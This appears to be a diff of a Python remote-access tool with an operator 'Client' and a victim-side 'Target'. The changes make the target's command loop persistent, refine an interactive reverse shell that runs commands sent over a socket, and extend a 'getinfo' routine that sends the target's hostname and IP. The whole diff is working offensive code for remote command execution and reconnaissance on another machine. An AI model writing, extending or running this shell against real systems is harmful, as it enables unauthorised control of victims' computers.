@@ -27,21 +27,29 @@ class Client(Machine):
 
     def reverse_shell_send_command(self):
         self.s.send(str.encode("shell"))
-        print("-->")
+        print("-->", end=" ")
         while True:
             cmd = input("")
+            if cmd == "quit":
+                print("Leaving Shell")
+                input("\n\nPress ENTER")
+                break
             if len(str.encode(cmd)) > 0:
                 self.s.send(str.encode(cmd))
                 client_response = str(self.s.recv(2048), "utf-8")
-                print(client_response)
+                print(client_response, end="")
 
     def getinfo(self):
         self.s.send(str.encode("getinfo"))
         i = 0
-        while i < 2:
-            info = self.s.recv(4096)
-            print(str(i) + " : " + info.decode("utf-8"))
+        while i < 3:
+            info = self.s.recv(2048)
+            if i == 0:
+                print(info.decode("utf-8"))
+            else:
+                print(str(i) + " : " + info.decode("utf-8"))
             i = i + 1
+        input("\n\n Press ENTER")
 
 
 # Target is the server
@@ -70,22 +78,23 @@ class Target(Machine):
         conn, address = self.s.accept()
         print("Connexion has been establish | " + "IP " + address[0] + " | Port : " + str(address[1]))
 
+
     def what_to_do(self):
-        instruction = conn.recv(2048)
-        if instruction.decode("utf-8") == "getinfo":
-            self.getinfo_target()
-        if instruction.decode("utf-8") == "shell":
-            self.reverse_shell_target()
-        if instruction.decode("utf-8") != "quit":
-            self.quit()
+        while True:
+            instruction = conn.recv(2048)
+            instruction = instruction.decode("utf-8")
+            if instruction == "shell":
+                self.reverse_shell_target()
+            if instruction == "getinfo":
+                self.getinfo_target()
+            if instruction == "quit":
+                break
 
     def reverse_shell_target(self):
-        shell_bool = True
-        while shell_bool:
+        while True:
             data = conn.recv(2048)
             if data.decode("utf-8") == "quit":
-                conn.send(str.encode("Leaving Shell.."))
-                shell_bool = False
+                break
             else:
                 try:
                     if data[:2].decode("utf-8") == 'cd':
@@ -101,10 +110,11 @@ class Target(Machine):
                     print(error_msg)
                     conn.send(str.encode(error_msg))
 
+    # Get information from the target
     def getinfo_target(self):
+        conn.send(str.encode("INFORMATION'S TARGET: \n"))
         conn.send(str.encode("Computer's name: " + socket.gethostname()))
         conn.send(str.encode("IP : " + socket.gethostbyname(socket.gethostname())))
-        conn.send(str.encode("----"))
 
     # close de connection and the socket
     def quit(self):
